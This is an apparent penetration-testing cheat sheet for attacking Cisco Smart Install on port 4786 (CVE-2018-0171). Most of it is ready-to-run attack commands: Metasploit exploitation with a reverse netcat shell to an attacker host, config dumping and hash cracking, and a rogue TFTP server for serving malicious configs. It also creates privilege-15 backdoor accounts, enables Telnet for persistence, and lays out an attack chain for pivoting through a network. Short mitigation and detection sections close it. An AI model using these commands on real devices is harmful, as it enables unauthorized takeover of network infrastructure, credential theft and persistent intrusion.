# CISCO SMART INSTALL ENUMERATION (Port 4786/TCP)

## SERVICE OVERVIEW
```
Cisco Smart Install (SMI) - Zero-touch switch deployment
- Port: 4786/TCP
- Used for remote switch configuration
- Cisco proprietary protocol
- CRITICAL vulnerabilities (unauthenticated access!)
- Deprecated by Cisco in 2018 (CVE-2018-0171)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p4786 <IP>                            # Service/Version detection
nc -nv <IP> 4786                                # Manual connection
telnet <IP> 4786                                # Alternative connection
```

## NMAP ENUMERATION
```bash
# Smart Install detection
nmap -p4786 --script cisco-smart-install <IP>   # Cisco SMI script
nmap -sV -p4786 <IP>                            # Version detection

# Comprehensive scan
nmap -sV -p4786 -A <IP> -oA cisco_smi_scan
```

## CISCO SMART INSTALL CLIENT (SIET)
```bash
# SIET - Smart Install Exploitation Tool
git clone https://github.com/Sab0tag3d/SIET
cd SIET
pip install -r requirements.txt

# Run SIET
python siet.py -i <IP> -p 4786

# SIET features:
# - Extract device configuration
# - Change TFTP server address
# - Execute IOS commands
# - Update IOS image
# - Copy files from device
```

## SMART INSTALL EXPLOITATION (CVE-2018-0171)
```bash
# CVE-2018-0171: Unauthenticated remote code execution
# Allows complete device takeover

# Metasploit module
msfconsole
use exploit/multi/misc/cisco_smart_install
set RHOSTS <IP>
set RPORT 4786
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <attacker_IP>
set LPORT 4444
exploit

# Manual exploitation with SIET
python siet.py -i <IP> -g                       # Get config
python siet.py -i <IP> -c "show running-config" # Execute command
```

## EXTRACT CONFIGURATION
```bash
# Using SIET to dump configuration
python siet.py -i <IP> -g                       # Get running-config

# Configuration contains:
# - Enable password (MD5 hash)
# - Usernames and passwords
# - SNMP community strings
# - VLANs and network topology
# - ACLs and routing information
# - Connected devices

# Save configuration
python siet.py -i <IP> -g > cisco_config.txt
```

## PASSWORD HASH CRACKING
```bash
# Extract password hashes from configuration
grep -E "enable secret|username" cisco_config.txt

# Example hashes:
# enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0
# username admin secret 5 $1$abc$defghijklmnopqrstuvwxyz

# Crack with John the Ripper
echo '$1$mERr$hx5rVt7rPNoS4wqbXKX7m0' > cisco.hash
john --wordlist=rockyou.txt cisco.hash

# Crack with Hashcat
hashcat -m 500 cisco.hash rockyou.txt           # MD5crypt (type 5)
hashcat -m 9200 cisco.hash rockyou.txt          # Type 8 (PBKDF2-SHA256)
hashcat -m 5700 cisco.hash rockyou.txt          # Type 4 (SHA256)
```

## CHANGE TFTP SERVER (MITM ATTACK)
```bash
# Redirect switch to attacker's TFTP server
# This allows intercepting/modifying config updates

# Set up rogue TFTP server
apt-get install tftpd-hpa
mkdir /srv/tftp
echo "malicious_config" > /srv/tftp/config.txt

# Change TFTP server with SIET
python siet.py -i <IP> -t <attacker_IP>         # Change TFTP server

# Wait for switch to request config from your TFTP server
# Serve malicious configuration
```

## EXECUTE IOS COMMANDS
```bash
# Using SIET to execute arbitrary IOS commands
python siet.py -i <IP> -c "show version"
python siet.py -i <IP> -c "show running-config"
python siet.py -i <IP> -c "show ip interface brief"
python siet.py -i <IP> -c "show vlan"

# Create backdoor user
python siet.py -i <IP> -c "configure terminal"
python siet.py -i <IP> -c "username backdoor privilege 15 secret Password123!"
python siet.py -i <IP> -c "end"
python siet.py -i <IP> -c "write memory"

# Enable Telnet for persistent access
python siet.py -i <IP> -c "configure terminal"
python siet.py -i <IP> -c "line vty 0 4"
python siet.py -i <IP> -c "login local"
python siet.py -i <IP> -c "transport input telnet ssh"
python siet.py -i <IP> -c "end"
python siet.py -i <IP> -c "write memory"
```

## VULNERABILITY SCANNING
```bash
# Check for CVE-2018-0171
nmap -p4786 --script cisco-smart-install <IP>

# Metasploit scanner
msfconsole
use auxiliary/scanner/misc/cisco_smart_install_scanner
set RHOSTS <IP>
run

# Known vulnerabilities:
# CVE-2018-0171: RCE via Smart Install
# CVE-2016-6415: SMI protocol abuse
# Multiple configuration extraction vulnerabilities
```

## METASPLOIT MODULES
```bash
msfconsole

# Exploitation
use exploit/multi/misc/cisco_smart_install
set RHOSTS <IP>
exploit

# Scanner
use auxiliary/scanner/misc/cisco_smart_install_scanner
set RHOSTS <IP>
run

# Config dumper
use auxiliary/scanner/cisco/cisco_smart_install_config_grab
set RHOSTS <IP>
run
```

## COMMON MISCONFIGURATIONS
```
☐ Smart Install enabled on production switches
☐ Port 4786 exposed to internet
☐ No authentication required (by design!)
☐ Switches not patched for CVE-2018-0171
☐ Smart Install not disabled despite Cisco deprecation
☐ Weak enable passwords (MD5 hashes)
☐ Default SNMP community strings in config
☐ No network segmentation (management VLAN exposed)
☐ Telnet enabled with weak passwords
```

## QUICK WIN CHECKLIST
```
☐ Scan for port 4786 (Cisco Smart Install)
☐ Test for CVE-2018-0171 vulnerability
☐ Extract device configuration (SIET or Metasploit)
☐ Extract password hashes from config
☐ Crack enable secret and user passwords
☐ Look for SNMP community strings
☐ Execute IOS commands (show version, show run)
☐ Create backdoor administrative user
☐ Enable Telnet/SSH for persistent access
☐ Document network topology from config
```

## ONE-LINER EXPLOITATION
```bash
# Quick config dump with SIET
python siet.py -i <IP> -g > config.txt && grep -E "enable secret|username|snmp" config.txt

# Metasploit quick exploit
msfconsole -q -x "use exploit/multi/misc/cisco_smart_install; set RHOSTS <IP>; exploit"
```

## POST-EXPLOITATION
```bash
# After extracting config:

# 1. Identify network topology
grep -E "interface|ip address|vlan" config.txt

# 2. Extract credentials
grep -E "enable secret|username|snmp-server community" config.txt

# 3. Crack passwords
john --wordlist=rockyou.txt hashes.txt

# 4. Create persistent access
# - Add backdoor user
# - Enable Telnet/SSH
# - Add to AAA authentication

# 5. Pivot to other devices
# - Use switch as jump point
# - Access connected VLANs
# - Attack management network
```

## PERSISTENCE MECHANISMS
```bash
# Create backdoor user
python siet.py -i <IP> -c "username backdoor privilege 15 secret Backdoor123!"

# Enable Telnet
python siet.py -i <IP> -c "line vty 0 4"
python siet.py -i <IP> -c "login local"
python siet.py -i <IP> -c "transport input all"

# Modify AAA authentication
python siet.py -i <IP> -c "aaa new-model"
python siet.py -i <IP> -c "aaa authentication login default local"

# Save configuration
python siet.py -i <IP> -c "write memory"

# Connect via Telnet with backdoor user
telnet <IP>
> backdoor
> Backdoor123!
```

## SECURITY IMPLICATIONS
```
RISKS:
- Complete device takeover (unauthenticated!)
- Configuration extraction (passwords, topology)
- Credential theft (enable secret, SNMP community)
- Network topology disclosure
- Man-in-the-Middle via rogue TFTP
- Persistent backdoor access
- Lateral movement to managed devices
- DoS (device reload, config wipe)

ATTACK CHAIN:
1. Scan for port 4786 (Smart Install)
2. Extract configuration (SIET/Metasploit)
3. Crack passwords from config
4. Create backdoor user
5. Enable Telnet/SSH
6. Pivot to other network devices
7. Enumerate entire network
8. Compromise critical systems

RECOMMENDATIONS:
- Disable Smart Install immediately (vstack disable)
- Patch to IOS version with CVE-2018-0171 fix
- Block port 4786 at firewall
- Implement management VLAN with ACLs
- Use strong enable secrets (type 8 or 9, not type 5)
- Disable Telnet, use SSH only
- Change default SNMP community strings
- Regular configuration audits
- Network segmentation (separate management network)
```

## CISCO MITIGATION
```bash
# Disable Smart Install (IOS command)
Switch(config)# vstack disable

# Verify Smart Install is disabled
Switch# show vstack config
Smart Install: disabled

# Block port 4786 with ACL
Switch(config)# access-list 100 deny tcp any any eq 4786
Switch(config)# access-list 100 permit ip any any
Switch(config)# interface vlan 1
Switch(config-if)# ip access-group 100 in

# Upgrade to patched IOS version
# Check Cisco advisory for CVE-2018-0171
```

## TOOLS
```bash
# SIET (Smart Install Exploitation Tool)
git clone https://github.com/Sab0tag3d/SIET
python siet.py -i <IP> -g

# Metasploit
use exploit/multi/misc/cisco_smart_install
use auxiliary/scanner/cisco/cisco_smart_install_config_grab

# Nmap
nmap -p4786 --script cisco-smart-install <IP>

# John the Ripper (crack Cisco hashes)
john --wordlist=rockyou.txt cisco.hash

# Hashcat
hashcat -m 500 cisco.hash rockyou.txt           # Type 5 (MD5)
```

## DEFENSE DETECTION
```bash
# Monitor for Smart Install exploitation:
# - Connections to port 4786 from untrusted sources
# - Unusual TFTP requests
# - Configuration changes
# - New user account creation
# - Telnet/SSH enabled unexpectedly

# Cisco IOS logging
Switch# show logging | include Smart Install

# Check for unauthorized config changes
Switch# show archive config differences

# Verify no backdoor users
Switch# show run | include username
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover Cisco switches
nmap -p4786 --open <subnet>

# 2. Exploit Smart Install
python siet.py -i <IP> -g > config.txt

# 3. Extract credentials
grep "enable secret" config.txt > hashes.txt
john hashes.txt

# 4. Create backdoor
python siet.py -i <IP> -c "username backdoor privilege 15 secret Pwn3d!"

# 5. Access switch
telnet <IP>
# Login with backdoor

# 6. Enumerate network topology
show cdp neighbors
show ip route
show vlan

# 7. Pivot to other devices
# Access management VLAN
# Attack other switches/routers
# Compromise critical infrastructure
```
